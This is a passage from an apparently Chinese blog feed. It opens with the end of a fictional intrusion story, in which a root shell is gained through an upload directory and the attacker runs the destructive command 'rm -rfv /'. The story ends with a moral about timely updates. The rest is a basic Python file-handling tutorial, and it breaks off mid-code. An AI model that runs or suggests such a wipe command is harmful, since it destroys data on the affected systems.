</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来他便可以为所欲为了..</p>
<p>对，他最后进行了删库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后导致公司损失巨大..</p>
<h2 id="结语">结语</h2>
<p>虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。</p>
<p>但却值得我们思考，就我们能看到的来看&hellip;</p>
<ul>
<li>系统不更新容易被攻击</li>
<li>代码不更新容易出漏洞</li>
<li>密码更新太慢容易泄露</li>
<li>漏洞以更新来修复，不修则被利用</li>
</ul>
<p>而我们看不到的&hellip;</p>
<p>软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？</p>
<p>不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。</p>
<p>而不能站立不动甚至往回走。</p>
<p>物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。</p>
<p>甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..</p>
<p>以上，只是个人想法，若有不当之处，请在下面的评论插件中 <del>喷我</del> 纠正。</p>
]]></description>
</item><item>
    <title>Python 学习笔记——文件操作</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
    <pubDate>Sat, 05 Sep 2020 22:12:05 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/wy/wallhaven-wyzxvr.jpg" referrerpolicy="no-referrer">
            </div><h2 id="文件操作">文件操作</h2>
<h3 id="open">open</h3>
<p><code>open()</code> 是 Python 进行文件操作的关键函数，它有连个参数需要设置</p>
<ul>
<li>文件名 - 文件的名称，不多解释</li>
<li>模式 - 决定打开的文件是否可读写以及其他属性</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="s1">&#39;mode&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="读">读</h3>
<p>仅以只读方式打开一个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;filename.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样写也是一样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;filename&#34;</span><span class="p">,</span><span class="s2">&#34;rt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>&ldquo;r&rdquo;</strong> 表示读</p>
<p><strong>&ldquo;t&rdquo;</strong> 表示文本，这是函数默认设定好的，所以可以省略。</p>
<p>这里引入一下 <a href="https://www.w3schools.com/python/python_file_handling.asp" target="_blank" rel="noopener noreffer">w3school</a> 的一个列表</p>
<blockquote>
<p>There are four different methods (modes) for opening a file:</p>
<blockquote>
<p>&ldquo;r&rdquo; - Read - Default value. Opens a file for reading, error if the file does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;a&rdquo; - Append - Opens a file for appending, creates the file if it does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;w&rdquo; - Write - Opens a file for writing, creates the file if it does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;x&rdquo; - Create - Creates the specified file, returns an error if the file exists</p>
</blockquote>
<p>In addition you can specify if the file should be handled as binary or text mode</p>
<blockquote>
<p>&ldquo;t&rdquo; - Text - Default value. Text mode</p>
</blockquote>
<blockquote>
<p>&ldquo;b&rdquo; - Binary - Binary mode (e.g. images)</p>
</blockquote>
</blockquote>
<p>以一个文件举例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/home/weepingdogel/test.txt
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们不写 mode 参数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们将它加上：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是一模一样的。</p>
<h4 id="读行">读行</h4>
<p>文件:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/home/weepingdogel/test.txt
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>当我们遇到一个多行文件的时候，我们可以选择只读取它其中一行
<code>f.readline()</code></p>
<p>例如:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们需要两行的时候：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果我们需要三行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个用法它会逐行读取，并且打印输出的时候是会换行的</p>
<p>在读配置文件的时候也许会用到吧&hellip;</p>
<p>当然我们也可以用 <code>for</code> 循环读一次性读全部：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>我觉得用 <code>for</code> 应该更有效率点&hellip;</p>
<h3 id="关闭文件">关闭文件</h3>
<p>这个没什么好讲的&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行了也是跟上面差不多的效果</p>
<blockquote>
<p>下面不给出调试结果了，太晚了。</p>
</blockquote>
<h3 id="创建">创建</h3>
<p><strong>&ldquo;x&rdquo;</strong> 表示创建一个新文件，如果文件名指的那个文件已经存在就会报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;x&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>自己去试试啦，这个没什么好说的。</p>
<h3 id="写">写</h3>
<p><strong>&ldquo;a&rdquo;</strong> 表示在已有文件上添加内容，它不会使文件原有的内容被删除或者被覆盖</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;加入内容 / content added.&#34;</span><span class="p">)</span> <span class="c1"># 这段字符串将会被添加到这个文件里</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>&ldquo;w&rdquo;</strong> 表示将会覆盖那个文件，它将会覆盖原有的内容</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;加入内容 / content added.&#34;</span><span class="p">)</span> <span class="c1"># 文件将只会存在这段字符串</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="删">删</h3>
<p>这里需要用到 <code>os</code> 这个模块，并用到里面的 <code>os.remove()</code> 函数，直接 <code>import os</code> 即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="典型例子">典型例子</h4>
<p>检测一个文件是否存在，如果存在就删除，不存在就提示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;文件不存在&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="删除目录">删除目录</h4>
<p>用 <code>os.rmdir()</code> 即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">(</span><span class="s2">&#34;foldername&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结">总结</h2>
<p>这些就是基础的文件读写操作需要知道的东西啦&hellip;</p>
<p>如果看完没什么概念的话，可以试试下面这一大串代码</p>
<p>可以改改里面 <code>open()</code> 的 mode 参数试试</p>
<p>总结代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sign</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 程序标识</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">╭╮╭╮╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮
</span></span></span><span class="line"><span class="cl"><span class="s1">┃┃┃┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱┃┃
</span></span></span><span class="line"><span class="cl"><span class="s1">┃┃┃┃┃┣━━┳━━┳━━┳┳━╮╭━━╮┃┃┃┣━━┳━━┳━━┫┃
</span></span></span><span class="line"><span class="cl"><span class="s1">┃╰╯╰╯┃┃━┫┃━┫╭╮┣┫╭╮┫╭╮┃┃┃┃┃╭╮┃╭╮┃┃━┫┃
</span></span></span><span class="line"><span class="cl"><span class="s1">╰╮╭╮╭┫┃━┫┃━┫╰╯┃┃┃┃┃╰╯┣╯╰╯┃╰╯┃╰╯┃┃━┫╰╮
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╰╯╰╯╰━━┻━━┫╭━┻┻╯╰┻━╮┣━━━┻━━┻━╮┣━━┻━╯
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filecrt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 文件创建</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span> <span class="c1">#检查文件是否存在</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span><span class="o">+</span> <span class="s2">&#34;: 文件已存在&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 已创建文件: &#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filewrt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">fruits</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;apple&#39;</span><span class="p">,</span> <span class="s1">&#39;banana&#39;</span><span class="p">,</span> <span class="s1">&#39;strawbarry&#39;</span><span class="p">,</span><span class="s1">&#39;orange&#39;</span><span class="p">]</span> <span class="c1"># 给出要写的内容</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 文件写入操作</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">fruit</span> <span class="ow">in</span> <span class="n">fruits</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fruit</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 已写入&#34;</span> <span class="o">+</span> <span class="n">fruit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filedel</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 删除文件操作</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 已删除&#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;不存在&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fileread</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 读取中..&#34;</span> <span class="p">)</span>
